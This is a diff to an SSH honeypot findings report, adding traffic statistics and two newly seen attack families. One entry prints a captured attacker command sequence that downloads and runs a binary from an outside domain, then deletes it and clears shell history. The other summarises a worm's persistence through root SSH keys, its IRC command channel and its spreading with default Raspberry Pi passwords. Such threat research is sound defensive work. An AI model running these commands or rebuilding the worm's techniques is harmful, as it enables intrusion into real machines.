@@ -1,14 +1,14 @@
-# Findings -- 163h on a public VPS
+# Findings -- 190h+ on a public VPS
 
 Helsinki VPS, port 22, fresh IP, no prior reputation.
-Data: 2026-05-26 11:37 UTC to 2026-06-02 13:08 UTC.
+Data: 2026-05-26 11:37 UTC to 2026-06-03 09:53 UTC.
 
 ```
-4005 auth attempts
- 233+ unique source IPs
-1217 sessions accepted
- 283553 commands captured
-  11 attack families identified
+4142 auth attempts
+ 267 unique source IPs
+1354 sessions accepted
+ 371940 commands captured
+  13 attack families identified
 ```
 
 ---
@@ -25,7 +25,8 @@ Not continuous. Two big waves, one quiet day.
 2026-05-30  60206 commands  -- family 10 first session, 78min, 4 binaries
 2026-05-31 102653 commands  -- family 10 again, family 11 first appearance
 2026-06-01 100196 commands  -- family 10 hits 4x, family 6 surge (7 hits in 2h)
-2026-06-02  18273 commands  -- family 10 active, F12/F13 first appearance (partial day)
+2026-06-02  ~40000 commands -- family 10 again, F12 and F13 confirmed
+2026-06-03   ~925 commands  -- partial day, ongoing
 ```
 
 Peak: 22:00 UTC, 1279 attempts in one hour (2026-05-27).
@@ -340,6 +341,70 @@ Binary analysis not done yet. What `meow` actually does is unknown.
 ![Meow dropper session replay](https://github.com/user-attachments/assets/4507138a-7d2e-4421-b960-ff7adf8893dc)
 
 *Session 72a973e0ba30 -- 1 command, 7s. The entire kill chain in a single exec: download, execute, create two backdoor users, change password, write credential to /tmp/mew. Done before you could read the first line.*
+
+---
+
+### 12. wowo dropper -- deploy and vanish
+
+One session June 2 01:53 UTC, session d9ddf36a96. Source IP 172.210.53.193.
+
+```bash
+chmod 777 /usr/bin/curl
+cd /tmp
+curl -O http://wowo.biz.id/wowiloveyou/runningaway.x86
+chmod 777 runningaway.x86
+./runningaway.x86 vipies
+rm -rf runningaway.x86
+history -c
+```
+
+Downloads a binary called `runningaway.x86` from `wowo.biz.id`, executes it with
+argument `vipies`, deletes it, wipes history. The argument is probably a campaign tag --
+different operators or deployments get different tags so the C2 can track them.
+
+`chmod 777 /usr/bin/curl` at the start is unusual. Either it's fixing permissions a
+previous attacker broke, or it's a habit from environments where curl gets locked down.
+
+I don't know what `runningaway.x86` does. I haven't analysed it. The domain `wowo.biz.id`
+is Indonesian (.id TLD, .biz subdomain). Beyond that I have nothing. The session came
+from the same IP as F13 (172.210.53.193) which is interesting -- same machine running
+multiple families, or same campaign infrastructure.
+
+Session preceded by a full F7-style 35-command recon (session 517b6d0aebb3). The wowo
+deploy only happens if the recon passes some internal check. I need to understand what
+that check is.
+
+TODO: check if wowo.biz.id/wowiloveyou/runningaway.x86 is still live, analyse the binary,
+figure out the relationship between F7 recon and F12 deploy.
+
+---
+
+### 13. gJw27HGL -- SSH worm (two-bot pattern)
+
+Two sessions June 2 09:40 UTC. What looked like a coordinated two-stage attack: one bot
+uploads a file to `/tmp/gJw27HGL` via SCP, a different IP executes it. The executor
+actually showed up 3.5h earlier at 06:06 -- before the upload. They're not coordinated,
+they just both hit the honeypot independently.
+
+The quarantine captured the payload. It's a bash script, 4.7KB. I haven't done a proper
+analysis yet -- I know what's in it from reading the source but I don't understand the
+full picture: what the IRC channel is used for, who operates it, what the binaries it
+references actually do, whether it's a known family. What I can see from the script:
+
+- kills a list of competing processes before doing anything
+- adds an SSH key to /root/.ssh/authorized_keys
+- connects to IRC and waits for commands
+- spreads itself via SSH using `sshpass` with hardcoded passwords
+
+The passwords it tries are Raspberry Pi defaults. So it's targeting Pi devices, not
+generic servers. Why it hit a Helsinki VPS running Ubuntu I don't fully understand yet --
+probably just spraying everything on port 22.
+
+This is the first real attacker payload the quarantine actually captured. Previous file
+in quarantine was my own test from dropper_sim.go.
+
+Analysis pending. I need to learn IRC C2 basics and how to trace a bash script's network
+behavior before I can say anything meaningful about this one.
 
 ---
 
